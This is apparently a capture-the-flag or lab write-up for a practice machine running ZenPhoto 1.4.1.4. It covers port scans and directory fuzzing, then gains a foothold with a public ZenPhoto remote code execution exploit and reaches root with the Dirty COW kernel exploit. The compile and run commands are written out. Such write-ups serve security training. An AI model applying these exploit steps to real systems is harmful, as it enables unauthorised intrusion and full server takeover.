## RECON
```bash
# IP ADDRESS
192.168.198.41

# HOSTNAME

# WEB SERVER
Apache httpd 2.2.14
# OPERATING SYSTEM
Ubuntu
```
## OPEN PORTS
```bash
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ipp     syn-ack ttl 61 CUPS 1.4
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql   syn-ack ttl 61 MySQL (unauthorized)
```
## NMAP OUTPUT
```bash
# Nmap 7.94SVN scan initiated Fri Nov 15 11:14:59 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.198.41
Nmap scan report for 192.168.198.41
Host is up, received echo-reply ttl 61 (0.037s latency).
Scanned at 2024-11-15 11:15:01 IST for 70s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIM3Qmxj/JapoH/Vg/pl8IAj0PTqw5Fj5rnhI+9Q0XT5tej5pHpUZoWTmbQKIwA7QBoTWtk4Hnonhkv5We43VXz0abBEvy3allgjf13cvxc96KX0bE7Bb8PhVCQJJBDTIz44koJhvFuSO/sauL9j+lzaUltVMR6/bZbigTINrV4nAAAAFQCvlVi2Us40FGWv8TILJYOR/LJvcwAAAIAHpp8VGuPUA5BowTa55myGr/lGs0xTFXbxFm0We4/D5v3L9kUVgv6MIVL4jweRmXFYvei7YZDGikoe6OjF9PFtSkKriEaGqav6hOER3tmtWChQfMlaNwiZfNJzKHBc4EqeCX4jpLLUxCZAEjwoE0koQRoFcbr+gywBNOQgtrfv+QAAAIA8v2C1COdjtNl4Bp3+XVLOkbYPIpedQXCgTLgRloa5wQZCaZimgE3+txqTQSb7Vp0B+LfjKdqcMFia8g9i+0YC+b69NimiFaZXU8euBoh/GXNo8K2vFHF3yznq6KNPG4+EW3WfaLGqJWkBJM2bb1nJ0YaJZhpOInv2Gsanh4CHOA==
|   2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA7aKskCBM7hdQEibRza0Y1BAiJ0prjECzVow5/txHOHb+Ynokd1ByaBw5roKsOExD3h7d7VGjNVKNqSwB+SBHSRivJaEgCtiV3F/5Q1qdBpehE4zyv7whG9GKeALeNk05icqXCk9kveUsreZyqEqN+c9p3Ed29jTD+6Alc7mml/Zev0EQs7hFfX/kYiV6V4KnQuQ7HXe3kzbMA9WB3yxtp0saBB5zlu4eWGsvyvCibP41ce81LtwkJDSXTr0LwBNYgZOD07GWW//BkOuJvHtKbWPqBievO0yubQxGbz0r7vID3a5DQMj4ZTGrAQPCunaJkGlvZs2zftrUh/BMxQSFLw==
23/tcp   open  ipp     syn-ack ttl 61 CUPS 1.4
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
|_http-server-header: CUPS/1.4
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.14 (Ubuntu)
3306/tcp open  mysql   syn-ack ttl 61 MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## ENUMERATION
```bash
# HTTP
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.2.14 ((Ubuntu))
---------------------------------------------------------------------------
-  sudo curl -vs $url | html2text
UNDER CONTRUCTION
- Fuzzing Files
index.html              [Status: 200, Size: 75, Words: 2, Lines: 5, Duration: 36ms]

- Fuzzing Folders
test                    [Status: 200, Size: 5015, Words: 345, Lines: 102, Duration: 355ms]
icons                   [Status: 200, Size: 72044, Words: 5070, Lines: 1003, Duration: 47ms]

- Found Version on Page source view-source:http://192.168.198.41/test/
- zenphoto version 1.4.1.4 


# MYSQL
3306/tcp open  mysql   syn-ack ttl 61 MySQL (unauthorized)
---------------------------------------------------------------------------

# TELNET
23/tcp   open  ipp     syn-ack ttl 61 CUPS 1.4
---------------------------------------------------------------------------

# SSH
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
-------------------------------------------------------------------------------------------------

```
## INITIAL FOOTHOLD
```bash
# Exploit - ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution | php/webapps/18083.php           
php 18083.php $ip /test/ 
zenphoto-shell# id                                                                            
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## PRIVILEGE ESCALATION
```bash
uname -a 
Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux

# Kernel exploit dirtycow 2
- Exploit - https://www.exploit-db.com/exploits/40839
searchsploit -m 40839
mv 40839.c dirty.c

- Transfer dirty.c to Zenphoto machine
gcc -pthread dirty.c -o dirty -lcrypt
./dirty new password

sudo firefart
Password: newpassword

# root
```
